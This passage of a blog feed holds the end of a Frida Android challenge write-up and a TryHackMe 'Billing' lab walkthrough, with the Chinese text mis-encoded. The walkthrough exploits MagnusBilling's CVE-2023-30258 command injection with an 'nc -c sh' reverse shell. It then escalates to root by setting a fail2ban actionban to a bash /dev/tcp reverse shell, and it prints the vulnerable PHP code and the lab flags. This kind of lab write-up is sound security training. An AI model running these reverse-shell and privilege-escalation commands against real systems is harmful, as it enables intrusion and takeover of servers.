å±‚æœªè¢«è°ƒç”¨çš„æ–¹æ³•"></a>ä¸»åŠ¨è°ƒç”¨ Native å±‚æœªè¢«è°ƒç”¨çš„æ–¹æ³•</h1><h2 id="Hook-æ¨¡æ¿-2"><a href="#Hook-æ¨¡æ¿-2" class="headerlink" title="Hook æ¨¡æ¿"></a>Hook æ¨¡æ¿</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> native_adr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativePointer</span>(&lt;address_of_the_native_function&gt;);<br><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ª NativePointer å¯¹è±¡ï¼Œç”¨äºæ“ä½œå’Œè®¿é—® &lt;address_of_the_native_function&gt;å†…å­˜åœ°å€ã€‚</span><br><br><span class="hljs-keyword">const</span> native_function = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(native_adr, <span class="hljs-string">&#x27;&lt;return type&gt;&#x27;</span>, [<span class="hljs-string">&#x27;argument_data_type&#x27;</span>]);<br><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ª NativeFunction å¯¹è±¡ï¼Œå®ç°å¯¹ native å‡½æ•°çš„è°ƒç”¨å’Œæ§åˆ¶ã€‚</span><br><span class="hljs-comment">// native_adrï¼šä½¿ç”¨native_adr NativePointerå¯¹è±¡ï¼›</span><br><span class="hljs-comment">// &#x27;&lt;return type&gt;&#x27;ï¼šå‡½æ•°çš„è¿”å›å€¼ç±»å‹ï¼›</span><br><span class="hljs-comment">// [&#x27;argument_data_type&#x27;]ï¼šä¼ é€’ç»™å‡½æ•°çš„å‚æ•°ç±»å‹åˆ—è¡¨ã€‚</span><br><br><span class="hljs-title function_">native_function</span>(&lt;<span class="hljs-variable language_">arguments</span>&gt;);<br><span class="hljs-comment">// è°ƒç”¨ native_function å‡½æ•°ï¼Œå¦‚æœéœ€è¦ï¼Œå¯ä»¥ä¼ é€’&lt;arguments&gt;å‚æ•°ã€‚</span><br></code></pre></td></tr></table></figure><ul><li><code>NativePointer</code>ï¼šFrida ä¸­ä¸€ä¸ªè¡¨ç¤º native å†…å­˜åœ°å€çš„ JavaScript å¯¹è±¡ï¼Œå®ƒç”¨äºåœ¨ Frida è„šæœ¬ä¸­æ“ä½œå’Œè®¿é—® native å†…å­˜åœ°å€ï¼Œæ¯”å¦‚è¯»å–æˆ–å†™å…¥å†…å­˜ä¸­çš„æ•°æ®ï¼Œè°ƒç”¨å†…å­˜ä¸­çš„å‡½æ•°ç­‰ã€‚</li><li><code>NativeFunction</code>ï¼šFrida ä¸­ç”¨äºåœ¨ JavaScript ä¸­è°ƒç”¨ native å‡½æ•°çš„å¯¹è±¡ã€‚é€šè¿‡ NativeFunction å¯¹è±¡ï¼Œå¯ä»¥åœ¨ Frida è„šæœ¬ä¸­è°ƒç”¨ native å…±äº«åº“ï¼ˆå¦‚åŠ¨æ€é“¾æ¥åº“ï¼‰ä¸­çš„å‡½æ•°ï¼Œå®ç°å¯¹ native å‡½æ•°çš„è°ƒç”¨å’Œæ§åˆ¶ã€‚</li></ul><h2 id="Frida-0xA-Native-Hook"><a href="#Frida-0xA-Native-Hook" class="headerlink" title="Frida 0xA Native Hook"></a>Frida 0xA Native Hook</h2><p>é›·ç”µæ¨¡æ‹Ÿå™¨æ‰“å¼€ç›´æ¥é—ªé€€è¿è¡Œä¸äº†ï¼Œåé¢æ¢æˆäº† Android Studio</p><h3 id="MainActivity-2"><a href="#MainActivity-2" class="headerlink" title="MainActivity"></a>MainActivity</h3><p>å£°æ˜äº†ä¸€ä¸ª native å±‚çš„ <code>stringFromJNI</code> æ–¹æ³•</p><p><img src="https://img.dkdun.cn/v1/2025/12/a7d6e6d8a80d009e.png"></p><h3 id="Native-å±‚é€»è¾‘-2"><a href="#Native-å±‚é€»è¾‘-2" class="headerlink" title="Native å±‚é€»è¾‘"></a>Native å±‚é€»è¾‘</h3><p>æŸ¥çœ‹  <code>stringFromJNI</code> æ–¹æ³•å‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼ŒåŒæ—¶èƒ½çœ‹è§æœ‰ä¸€ä¸ª <code>get_flag</code> å‡½æ•°ï¼Œè·Ÿè¿›å‘ç°æ˜¯ä¸€ä¸ª flag è‡ªè§£å¯†ç¨‹åºï¼Œæ»¡è¶³å‚æ•°å’Œä¸º 3 ä¼šè§¦å‘è§£å¯†ï¼Œå¹¶å°†ç»“æœé€šè¿‡ <code>__android_log_print</code> æ‰“å°åœ¨æ—¥å¿—ä¸­ï¼Œè¿™ä¸ªå‡½æ•°åœ¨ç¨‹åºä¸­å¹¶æ²¡æœ‰è¢«è°ƒç”¨</p><p><img src="https://img.dkdun.cn/v1/2025/12/e3b1b404a1f9260e.png"></p><p>å› æ­¤æ–¹æ³•å°±æ˜¯åœ¨ frida ä¹‹ä¸­è¿›è¡Œ native å±‚çš„å£°æ˜å®ä¾‹åŒ–ï¼Œä¸»åŠ¨è°ƒç”¨å‡½æ•°</p><h3 id="hook-ä»£ç -2"><a href="#hook-ä»£ç -2" class="headerlink" title="hook ä»£ç "></a>hook ä»£ç </h3><p>å¼€å§‹ç›´æ¥ hook è¿™ä¸ª <code>get_flag</code> å‡½æ•°ä¼šæŠ¥é”™ <code>Error: libfrida0xa.so: unable to find export &#39;get_flag&#39;</code> æ‰¾ä¸åˆ°è¿™ä¸ªå‡½æ•°å</p><p><img src="https://img.dkdun.cn/v1/2025/12/8b6f59b1c7195af5.png"></p><p>æŒ‰ <code>Space</code> åœ¨  <code>get_flag</code> çš„åæ±‡ç¼–çª—å£åˆ‡æ¢æ–‡æœ¬èƒ½å‘ç°å…¶å®å‡½æ•°åæ˜¯  <code>_Z8get_flagii</code>ï¼Œæ‰€ä»¥æ¢æˆè¿™ä¸ªå°±æˆåŠŸäº†</p><p><img src="https://img.dkdun.cn/v1/2025/12/448aa425377824d6.png"></p><p>å¯ä»¥æ ¹æ®å†™å‡º hook ä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hookA</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> addr=<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(<span class="hljs-string">&quot;libfrida0xa.so&quot;</span>,<span class="hljs-string">&quot;_Z8get_flagii&quot;</span>)<br>    <span class="hljs-comment">// è·å– get_flag() å‡½æ•°åœ°å€</span><br>    <span class="hljs-keyword">var</span> get_flag_ptr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativePointer</span>(addr);<br><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ª NativePointer å¯¹è±¡ï¼Œç”¨äºæ“ä½œå’Œè®¿é—® get_flag() å‡½æ•°å†…å­˜åœ°å€ã€‚</span><br><br>    <span class="hljs-keyword">const</span> get_flag = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(get_flag_ptr, <span class="hljs-string">&#x27;void&#x27;</span>, [<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]);<br><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªåä¸º get_flag çš„ NativeFunction å¯¹è±¡ï¼Œå®ç°å¯¹ native å‡½æ•°çš„è°ƒç”¨å’Œæ§åˆ¶ã€‚</span><br>    <br>    <span class="hljs-title function_">get_flag</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Success!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hookA</span>();<br>    &#125;)<br>&#125;<br><span class="hljs-built_in">setTimeout</span>(main,<span class="hljs-number">500</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/95e0099d84953b70.png"></p>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
      <category>Frida</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Andriod</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Billing</title>
    <link href="/2025/04/02/THM-Billing/"/>
    <url>/2025/04/02/THM-Billing/</url>
    
    <content type="html"><![CDATA[<p>RCEã€sshdã€fail2ban</p><span id="more"></span><h1 id="æšä¸¾"><a href="#æšä¸¾" class="headerlink" title="æšä¸¾"></a>æšä¸¾</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>nmap æ‰«æ</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">nmap -<span class="hljs-built_in">T4</span> -n -<span class="hljs-keyword">sC </span>-sV -Pn -p- <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">225</span>.<span class="hljs-number">254</span><br></code></pre></td></tr></table></figure><p>æ‰«äº†åŠä¸ªå°æ—¶ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">Nmap</span> scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">225.254</span><br><span class="hljs-title class_">Host</span> is up (<span class="hljs-number">0.38</span>s latency).<br><span class="hljs-title class_">Not</span> <span class="hljs-symbol">shown:</span> <span class="hljs-number">65531</span> closed tcp ports (reset)<br><span class="hljs-title class_">PORT</span>     <span class="hljs-title class_">STATE</span> <span class="hljs-title class_">SERVICE</span>  <span class="hljs-title class_">VERSION</span><br><span class="hljs-number">22</span>/tcp   open  ssh      <span class="hljs-title class_">OpenSSH</span> <span class="hljs-number">8.4</span>p1 <span class="hljs-title class_">Debian</span> <span class="hljs-number">5</span>+deb11u3 (protocol <span class="hljs-number">2.0</span>)<br>| ssh-<span class="hljs-symbol">hostkey:</span><br>|   <span class="hljs-number">3072</span> <span class="hljs-number">79</span><span class="hljs-symbol">:ba</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span><span class="hljs-symbol">d:</span><span class="hljs-number">23</span><span class="hljs-symbol">:</span><span class="hljs-number">35</span><span class="hljs-symbol">:b2</span><span class="hljs-symbol">:f0</span><span class="hljs-symbol">:</span><span class="hljs-number">25</span><span class="hljs-symbol">:d7</span><span class="hljs-symbol">:</span><span class="hljs-number">53</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span><span class="hljs-symbol">e:</span><span class="hljs-symbol">c5:</span><span class="hljs-symbol">b9:</span><span class="hljs-symbol">af:</span><span class="hljs-symbol">c0:</span>cc (<span class="hljs-title class_">RSA</span>)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">4</span><span class="hljs-symbol">e:</span><span class="hljs-symbol">c3:</span><span class="hljs-number">34</span><span class="hljs-symbol">:af</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:b7</span><span class="hljs-symbol">:</span><span class="hljs-number">35</span><span class="hljs-symbol">:bc</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">f:</span><span class="hljs-symbol">f5:</span><span class="hljs-symbol">b0:</span><span class="hljs-symbol">d2:</span><span class="hljs-symbol">aa:</span><span class="hljs-number">35</span><span class="hljs-symbol">:ae</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span> (<span class="hljs-title class_">ECDSA</span>)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">26</span><span class="hljs-symbol">:aa</span><span class="hljs-symbol">:</span><span class="hljs-number">17</span><span class="hljs-symbol">:e0</span><span class="hljs-symbol">:c8</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">a:</span><span class="hljs-symbol">c9:</span><span class="hljs-symbol">d9:</span><span class="hljs-number">98</span><span class="hljs-symbol">:</span><span class="hljs-number">17</span><span class="hljs-symbol">:e4</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">f:</span><span class="hljs-number">87</span><span class="hljs-symbol">:</span><span class="hljs-number">73</span><span class="hljs-symbol">:</span><span class="hljs-number">78</span><span class="hljs-symbol">:</span><span class="hljs-number">4</span>d (<span class="hljs-title class_">ED25519</span>)<br><span class="hljs-number">80</span>/tcp   open  http     <span class="hljs-title class_">Apache</span> httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">56</span> ((<span class="hljs-title class_">Debian</span>))<br>| http-<span class="hljs-symbol">robots.txt:</span> <span class="hljs-number">1</span> disallowed entry<br>|_/mbilling/<br>| http-<span class="hljs-symbol">title:</span>             <span class="hljs-title class_">MagnusBilling</span><br>|_Requested resource was <span class="hljs-symbol">http:</span>//<span class="hljs-number">10.10</span>.<span class="hljs-number">225.254</span>/mbilling/<br>|_http-server-<span class="hljs-symbol">header:</span> <span class="hljs-title class_">Apache</span>/<span class="hljs-number">2.4</span>.<span class="hljs-number">56</span> (<span class="hljs-title class_">Debian</span>)<br><span class="hljs-number">3306</span>/tcp open  mysql    <span class="hljs-title class_">MariaDB</span> (unauthorized)<br><span class="hljs-number">5038</span>/tcp open  asterisk <span class="hljs-title class_">Asterisk</span> <span class="hljs-title class_">Call</span> <span class="hljs-title class_">Manager</span> <span class="hljs-number">2.10</span>.<span class="hljs-number">6</span><br><span class="hljs-title class_">Service</span> <span class="hljs-symbol">Info:</span> <span class="hljs-symbol">OS:</span> <span class="hljs-title class_">Linux</span>; <span class="hljs-symbol">CPE:</span> <span class="hljs-symbol">cpe:</span>/<span class="hljs-symbol">o:</span><span class="hljs-symbol">linux:</span>linux_kernel<br></code></pre></td></tr></table></figure><p>å¼€äº† 22ï¼ˆSSHï¼‰ï¼Œ80ï¼ˆHTTPï¼‰ï¼Œ3306ï¼ˆMariaDBï¼‰ï¼Œ5038ï¼ˆAsteriskï¼‰</p><h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>è®¿é—® 80 æœåŠ¡ï¼Œå‘ç°äº†ç™»å½•æ¡†ï¼Œä¸€ä¸ª MagnusBilling çš„ç¨‹åºï¼ŒMagnusBilling æ˜¯ä¸€ä¸ª VoIP æœåŠ¡å™¨ç³»ç»Ÿï¼Œæ²¡ä»€ä¹ˆæ”»å‡»ç‚¹</p><p><img src="https://img.dkdun.cn/v1/2025/12/ade8898c175cca9c.png"></p><h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><p>ç”¨ dirsearch  æµ…æ‰«ä¸€ä¸‹ç›®å½•</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dirsearch</span> -u http://<span class="hljs-number">10.10.88.248</span>/mbilling/ -i <span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/f43422faa1bddd06.png"></p><p>è¯»å– <code>README.md</code> å‘ç°æ˜¯ <code>MagnusBilling 7</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/5908119781e5fdaf.png"></p><p>æœ â€œMagnusBilling æ¼æ´â€ èƒ½æ‰¾åˆ° <a href="https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/">MagnusBilling application unauthenticated Remote Command Execution.</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/5e96c4b6d553333d.png"></p><p>è®¿é—® <code>http://10.10.225.254/mbilling/lib</code> ç›®å½•</p><p><img src="https://img.dkdun.cn/v1/2025/12/31f0fcb362e4d0d4.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/367bafcec7d7b91e.png"></p><h1 id="åˆ©ç”¨-MagnusSolution-Magnusbilling-RCE-åå¼¹-shell"><a href="#åˆ©ç”¨-MagnusSolution-Magnusbilling-RCE-åå¼¹-shell" class="headerlink" title="åˆ©ç”¨ MagnusSolution Magnusbilling RCE åå¼¹ shell"></a>åˆ©ç”¨ MagnusSolution Magnusbilling RCE åå¼¹ shell</h1><p>æ ¹æ®æ¼æ´æè¿°ï¼Œæ¼æ´åº”è¯¥æ˜¯ <a href="https://avd.aliyun.com/detail?id=AVD-2023-30258">magnusbilling å®‰å…¨æ¼æ´ (CVE-2023-30258)</a></p><p>ç”¨çš„ n0o0b å¸ˆå‚…å†™çš„ POCï¼š<a href="https://github.com/n00o00b/CVE-2023-30258-RCE-POC">CVE-2023-30258-RCE-POC</a></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">python poc.py -u http:<span class="hljs-string">//10.10.133.205/mbilling</span> <span class="hljs-params">--cmd</span> <span class="hljs-string">&quot;nc -c sh 10.21.118.213 1234&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/9c253cf0cdf590d8.png"></p><p>è°ˆä¸Šäº†å˜»å˜»å¥½ç”¨æ</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python3 -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><p>å¯ä»¥æé«˜äº¤äº’æ€§</p><p>è¿›å…¥ <code>/home/magnus</code> æ‹¿åˆ° flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">THM</span>&#123;<span class="hljs-number">4</span>a6831d5f124b25eefb1e92e0f0da4ca&#125;<br></code></pre></td></tr></table></figure><h1 id="ä¿®æ”¹-fail2ban-çš„-sshd-è§„åˆ™ç»„ææƒ"><a href="#ä¿®æ”¹-fail2ban-çš„-sshd-è§„åˆ™ç»„ææƒ" class="headerlink" title="ä¿®æ”¹ fail2ban çš„ sshd è§„åˆ™ç»„ææƒ"></a>ä¿®æ”¹ fail2ban çš„ sshd è§„åˆ™ç»„ææƒ</h1><p>ä½¿ç”¨ <code>sudo -l</code> å‘ç°</p><p><img src="https://img.dkdun.cn/v1/2025/12/4da0342bcb66d9a6.png"></p><p><code>NOPASSWD</code> çš„ <code>fail2ban-client</code>ï¼Œæ›´è¯¦ç»†çš„ <code>fail2ban</code> ææƒå¯ä»¥çœ‹ <a href="https://juggernaut-sec.com/fail2ban-lpe/">Fail2Ban â€“ Linux Privilege Escalation</a>ï¼Œä½† <code>iptables-multiport.conf</code> æ²¡æœ‰å†™çš„æƒé™ã€‚</p><p>è¿è¡Œ <code>fail2ban-client</code> æ‰¾åˆ°</p><p><img src="https://img.dkdun.cn/v1/2025/12/b172b7389122579a.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> &lt;JAIL&gt; action &lt;ACT&gt; actionban &lt;CMD&gt;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‘½ä»¤èƒ½å¤Ÿè‡ªå®šä¹‰ <code>jail</code> å’Œ <code>action</code> ï¼Œå¹¶ä¸”å‰é¢å‘ç°æ˜¯ <code>NOPASSWD</code> ï¼Œå¯ä»¥æ‰§è¡Œ sudo æƒé™</p><p>æŸ¥çœ‹ <code>fail2ban-client</code> çš„çŠ¶æ€ï¼Œå‘ç°äº†æ´»è·ƒçš„ <code>sshd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> fail2ban-client status<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/f133287a33f97ca6.png"></p><p>è¯»å– <code>/etc/fail2ban</code> ä¸‹çš„ <code>jail.conf</code> æ–‡ä»¶å‘ç°äº† <code>sshd</code> é…ç½®</p><p><img src="https://img.dkdun.cn/v1/2025/12/472d3486dc39fa44.png"></p><p>ç»¼ä¸Šæ‰€è¿°ï¼Œå¯ä»¥ä¿®æ”¹ <code>sshd</code> çš„ <code>actionban</code> è§„åˆ™æ¥æ‰§è¡Œ ï¼šåœ¨å°ç¦ IP æ—¶æ‰§è¡Œä¸€ä¸ªåå‘ Shell è¿æ¥ï¼Œé€šè¿‡å°ç¦æœ¬æœº IP <code>127.0.0.1</code> è¿™ä¸€æ“ä½œè§¦å‘ <code>actionban</code> ï¼Œè®©åå‘ Shell è¿æ¥ç”Ÿæ•ˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> /usr/bin/fail2ban-client <span class="hljs-built_in">set</span> sshd action iptables-multiport actionban <span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.21.118.213/2233 0&gt;&amp;1&#x27;&quot;</span><br><br><span class="hljs-built_in">sudo</span> /usr/bin/fail2ban-client <span class="hljs-built_in">set</span> sshd banip 127.0.0.1<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d69cc689cfed3a72.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">THM</span>&#123;<span class="hljs-number">33</span>ad5b530e71a172648f424ec23fae60&#125;<br></code></pre></td></tr></table></figure><h1 id="CVE-2023-30258"><a href="#CVE-2023-30258" class="headerlink" title="CVE-2023-30258"></a>CVE-2023-30258</h1><p>æ ¹æ®æè¿° <a href="https://eldstal.se/advisories/230327-magnusbilling.html">CVE-2023-30258 Security advisory</a> æ‰¾åˆ°æºä»£ç  </p><p><img src="https://img.dkdun.cn/v1/2025/12/3156c7eee9182ce3.png"></p><p><a href="https://github.com/magnussolution/magnusbilling7/blob/f6cd038161349895ff6f186405b9a89f564c9448/lib/icepay/icepay.php#L753">magnusbilling  çš„æ¼æ´ç‚¹</a> å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;democ&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;democ&#x27;</span>]) &gt; <span class="hljs-number">5</span>) &#123;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;touch &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;democ&#x27;</span>] . <span class="hljs-string">&#x27;.txt&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;rm -rf *.txt&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>democ æ£€æŸ¥å­—ç¬¦é•¿åº¦æ˜¯å¦è¶…è¿‡5ï¼Œè¶…è¿‡åå°±å°†å­—ç¬¦ä¸²ä¼ é€’ç»™äº† <code>exec()</code> å‡½æ•°ï¼Œå¹¶æ²¡æœ‰ç»è¿‡è¿‡æ»¤ï¼Œæ‰€ä»¥å°±èƒ½æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå‡ºç°äº†å‘½ä»¤æ³¨å…¥</p><h1 id="Fail2Ban"><a href="#Fail2Ban" class="headerlink" title="Fail2Ban"></a>Fail2Ban</h1><p>ä¸€ä¸ªå¼€æºçš„å…¥ä¾µé˜²å¾¡å·¥å…·ï¼Œç”¨äºé˜²æ­¢æš´åŠ›ç ´è§£æ”»å‡»ã€‚å®ƒé€šè¿‡ç›‘æ§ç³»ç»Ÿçš„æ—¥å¿—æ–‡ä»¶ï¼ˆå¦‚ <code>/var/log/auth.log</code>ï¼‰ï¼Œæ£€æµ‹æ˜¯å¦å­˜åœ¨å¤šæ¬¡å¤±è´¥çš„ç™»å½•å°è¯•ã€‚ä¸€æ—¦æ£€æµ‹åˆ°æŸä¸ª IP åœ°å€åœ¨çŸ­æ—¶é—´å†…å‘ç”Ÿäº†å¤šæ¬¡å¤±è´¥çš„ç™»å½•å°è¯•ï¼Œ<code>fail2ban</code> ä¼šè‡ªåŠ¨å°†è¯¥ IP åœ°å€åŠ å…¥é˜²ç«å¢™çš„é»‘åå•ï¼Œé˜»æ­¢è¯¥ IP åœ°å€è¿›ä¸€æ­¥å°è¯•ç™»å½•ï¼Œå°ç¦æ—¶é—´è¿‡åä¼šæ¢å¤æ­£å¸¸è®¿é—®ï¼Œå¦‚æœå†æ¬¡æ”»å‡»ï¼Œå°ç¦ä¼šå†æ¬¡ç”Ÿæ•ˆã€‚</p><p>å…³é”®é…ç½®æ–‡ä»¶</p><ul><li>fail2ban.confï¼šé…ç½®æ“ä½œè®¾ç½®</li><li>jail.confï¼šä¸»é…ç½®æ–‡ä»¶ï¼Œç”¨äºå®šä¹‰æ¯ä¸ªç¨‹åºçš„ â€jailsâ€œ</li><li>jail.localï¼šjail.conf çš„æ‰©å±•ï¼Œç”¨äºå¯ç”¨ jailï¼Œé€šå¸¸åœ¨æ›´æ–°åä¿ç•™è‡ªå®šä¹‰è®¾ç½®</li><li>iptables-multiport.confï¼šè´Ÿè´£è®¾ç½®é˜²ç«å¢™çš„æ“ä½œæ–‡ä»¶ï¼Œå…è®¸ä¿®æ”¹ä»¥ç¦æ­¢æ¶æ„ IPï¼Œå¹¶æ ¹æ®éœ€è¦æ·»åŠ å’Œåˆ é™¤</li></ul><p>fail2ban æƒé™æå‡å¯ä»¥çœ‹ <a href="https://juggernaut-sec.com/fail2ban-lpe/">Fail2Ban â€“ Linux Privilege Escalation</a>ï¼Œå¯æƒœçš„æ˜¯é¶æœº <code>iptables-multiport.conf</code> æ²¡æœ‰å†™çš„æƒé™ã€‚</p><p>å¯¹äºè¿™ä¸ªé¶æœºï¼Œé€šè¿‡æšä¸¾äº†æ´»è·ƒçš„ <code>jail</code> æ‰¾åˆ°äº† <code>sshd</code>ï¼Œç„¶åæ ¹æ® <code>fail2ban</code> çš„ä½¿ç”¨å‘½ä»¤æ„é€  payload ä¿®æ”¹ <code>sshd</code> çš„è§„åˆ™ç»„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> /usr/bin/fail2ban-client <span class="hljs-built_in">set</span> sshd action iptables-multiport actionban <span class="hljs-string">&quot;payload&quot;</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œ ban IP è§¦å‘ <code>actionban</code> é€»è¾‘è®©å‰é¢çš„å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> /usr/bin/fail2ban-client get sshd banip IP<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fail2ban</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-3æœˆ</title>
    <link href="/2025/03/31/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-3%E6%9C%88/"/>
    <url>/2025/03/31/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-3%E6%9C%88/</url>
    
